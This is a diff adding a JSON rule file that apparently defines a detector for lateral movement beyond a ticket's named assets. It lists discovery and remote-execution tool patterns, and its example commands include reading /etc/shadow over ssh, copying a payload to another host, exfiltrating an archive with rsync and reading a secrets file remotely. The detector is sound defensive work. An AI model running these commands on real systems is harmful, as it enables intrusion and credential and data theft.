@@ -1,0 +1,25 @@
+{
+  "_doc": "Commands and patterns indicative of S13 (lateral movement). The rule fires when a session contains commands that attempt to discover, probe, or jump to OTHER hosts beyond the ticket's named_assets.",
+  "discovery_patterns": [
+    "nmap", "masscan", "ping -c", "traceroute",
+    "arp -a", "ip neighbour", "netstat -an",
+    "showmount -e", "rpcinfo -p",
+    "smbclient -L", "enum4linux"
+  ],
+  "jump_patterns": [
+    "ssh ", "scp ", "rsync ",
+    "psexec.exe", "wmiexec",
+    "winrm", "powershell -ComputerName",
+    "Invoke-Command -ComputerName"
+  ],
+  "lateral_command_examples": [
+    "nmap -sV 10.0.0.0/24",
+    "ssh root@10.0.0.42 'cat /etc/shadow'",
+    "scp /tmp/payload.sh user@10.0.0.55:/tmp/",
+    "wmiexec.py admin@target-host",
+    "powershell -ComputerName fileserver-01 -ScriptBlock {Get-ChildItem C:\\}",
+    "rsync -avz /tmp/exfil.tar.gz user@10.0.0.99:/var/tmp/",
+    "Invoke-Command -ComputerName win-fileshare-01 -ScriptBlock {Get-Content C:\\Users\\Public\\secrets.txt}",
+    "smbclient -L //win-fileshare-01"
+  ]
+}
